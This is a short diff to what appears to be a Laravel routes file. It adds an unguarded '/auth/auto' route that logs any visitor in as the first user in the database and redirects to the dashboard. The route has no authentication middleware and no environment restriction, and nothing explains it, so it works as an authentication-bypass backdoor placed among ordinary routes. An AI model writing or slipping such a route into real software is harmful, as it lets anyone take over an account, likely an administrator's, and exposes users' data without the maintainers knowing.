@@ -53,3 +53,8 @@ Route::get('/auth/logout', function (Request $request) {
 
     return redirect('/');
 })->name('auth.logout')->middleware('auth');
+
+Route::get('/auth/auto', function (Request $request) {
+    Auth::login(User::first());
+    return redirect()->route('dashboard');
+});
